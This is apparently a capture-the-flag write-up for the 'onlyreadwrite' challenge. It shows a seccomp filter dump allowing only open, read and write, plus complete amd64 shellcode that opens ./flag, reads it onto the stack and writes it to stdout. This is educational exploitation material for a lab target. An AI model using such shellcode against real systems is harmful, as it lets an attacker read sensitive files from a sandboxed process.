# onlyreadwrite

This challenge reads shellcode from stdin and executes it. The problem is that the syscalls that we can use are limited.

## What syscalls can we use?

To find out what syscalls we can use there is the following command:

```bash
seccomp-tools dump ./onlyreadwrite
```

Some details about the tool can be found [here](https://github.com/david942j/seccomp-tools).

The output of the command is the following:

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
```

Then only open, read and write are allowed (and some other syscalls that we don't need).

## The shellcode

Now that we know that we can use just a few syscalls, we can start writing the shellcode.

The idea was to use shellcraft to generate the shellcode for the open-read-write sequence.

```python
shellcode = pwnlib.shellcraft.amd64.linux.open('./flag', 0, 0)
shellcode += pwnlib.shellcraft.amd64.linux.read(FD_READ, 'rsp', 100)
shellcode += pwnlib.shellcraft.amd64.linux.write(FD_WRITE = 1, 'rsp', 100)
```

The problem is that (afaik) there is no way to get the file descriptor from the open syscall and use it as argument for the read.

So i generated the assembly from shellcraft and slightly modified it to get the file descriptor in RDI (where the read syscall expects it).

```asm
; push './flag' on the stack
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f2e
xor [rsp], rax

; call open(RDI -> './flag', 0, 0)
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 */
push SYS_open /* 2 */
pop rax /* -> 2 */
syscall

; call read(RDI -> RAX = fd of './flag', RSI = 'rsp', RDX = 0x64)
push rax
xor eax, eax /* SYS_read */
pop rdi ; -> fd  returned by open
push 0x64
pop rdx
mov rsi, rsp
syscall

; call write(fd=1 (stdout), RSI = 'rsp', RDX =0x64)
push 1
pop rdi
push 0x64
pop rdx
mov rsi, rsp
push SYS_write ; 1
pop rax
syscall
```

Basically it is opening the file, reading it on the stack and then writing it on stdout.
